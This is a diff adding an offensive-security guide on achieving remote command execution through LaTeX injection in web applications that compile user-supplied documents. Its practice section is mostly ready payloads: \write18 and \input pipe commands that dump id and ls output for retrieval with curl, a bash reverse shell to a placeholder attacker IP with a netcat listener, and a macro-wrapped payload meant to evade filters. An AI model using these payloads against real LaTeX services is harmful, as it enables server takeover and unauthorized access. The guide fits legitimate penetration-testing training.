@@ -1,0 +1,109 @@
+---
+title: Command Execution via LaTeX Injection Techniques
+description: Learn to exploit LaTeX injection for command execution in web applications.
+keywords:
+- LaTeX injection
+- command execution
+- shell-escape
+- reverse shell
+- "\t2write18"
+---
+
+# Command Execution
+
+## Context
+
+The aim of this guide is to equip offensive security operators with the skills required to perform remote command execution through LaTeX injection vulnerabilities in web server applications. Readers are expected to understand the structure and compilation process of LaTeX documents, basic shell command syntax, general command execution contexts in server-side environments, and the fundamentals of LaTeX injection attacks.
+
+## Theory
+
+### LaTeX Shell-Escape Mechanism
+
+The LaTeX primitive `\write18` is a powerful feature that allows the execution of shell commands during the document compilation process. For the execution of these commands, shell-escape must be enabled, usually through a `-shell-escape` flag during compilation. If unsanitized, user-controlled LaTeX input can leverage this functionality to execute arbitrary commands on the server, presenting a substantial security risk.
+
+### Command Injection Vectors in LaTeX
+
+Attackers can inject commands using LaTeX-specific syntax to exploit vulnerabilities. For instance, `\write18{<command>}` or its variant `\immediate\write18{<command>}` can be injected into LaTeX source to execute shell commands. Another vector is the misuse of `\input{|<command>}` to include the output of shell commands directly into the document. To evade basic input sanitation filters, attackers can obfuscate their payloads using LaTeX macros or encoding techniques.
+
+### Reverse Shells and Data Exfiltration via LaTeX
+
+With command execution capabilities, attackers can establish outbound connections, such as reverse shells, if the network permits such activity. The LaTeX command execution context can be exploited to encode reverse shell payloads in base64 or directly in the `\write18` syntax, allowing attackers to interactively control the compromised host.
+
+### Detection and Exploitation Preconditions
+
+Successful exploitation of these vulnerabilities requires that the target LaTeX service is configured to compile user-supplied documents with shell-escape enabled. Additionally, the malicious LaTeX must pass through any input sanitization process to reach the compilation stage.
+
+## Practice
+
+### Direct Command Execution via \write18
+
+- **Payload**
+  ```latex
+  \immediate\write18{id > /tmp/latex_rce.txt}
+  ```
+  This exploits the `\write18` command to execute `id` and write its output to `/tmp/latex_rce.txt`.
+  
+- **Trigger and Output Retrieval**
+  - Ensure the target server processes and compiles the injected document using LaTeX.
+  - Use the following command to retrieve output:
+    ```bash
+    curl http://<target>/files/latex_rce.txt
+    ```
+
+Expected Outcome: Successful execution of arbitrary shell commands on the LaTeX server.
+
+### Command Execution via \input Pipe Syntax
+
+- **Payload**
+  ```latex
+  \input|ls / > /tmp/latex_ls.txt|
+  ```
+  The command `ls /` is executed, and its output is written to the specified file.
+  
+- **Trigger and Output Retrieval**
+  - Compile the document containing the injected LaTeX on the server.
+  - Retrieve the command output using:
+    ```bash
+    curl http://<target>/files/latex_ls.txt
+    ```
+
+Expected Outcome: Execution of shell commands using LaTeX pipe syntax.
+
+### Reverse Shell via \write18
+
+- **Payload**
+  ```latex
+  \immediate\write18{bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'}
+  ```
+  This command initiates a reverse shell directed at the attacker's IP and port.
+  
+- **Preparation and Exploitation**
+  - Start a listener on the attacker's machine:
+    ```bash
+    nc -lvnp <attacker_port>
+    ```
+  - Compile the malicious LaTeX file on the target, enabling the reverse shell connection.
+
+Expected Outcome: The attacker gains interactive shell access to the compromised server for further exploitation.
+
+### Obfuscated Payload to Bypass Filters
+
+- **Payload**
+  ```latex
+  \def\x{\immediate\write18{whoami > /tmp/obf.txt}}\x
+  ```
+  This payload uses a macro to bypass pattern matching defenses.
+  
+- **Execution and Retrieval**
+  - Ensure document compilation on the target server.
+  - Retrieve output by accessing:
+    ```bash
+    curl http://<target>/files/obf.txt
+    ```
+
+Expected Outcome: Execution of commands in spite of basic input filtering, highlighting the need for effective sanitization strategies.
+
+## Tools
+
+- **curl**
+- **netcat**
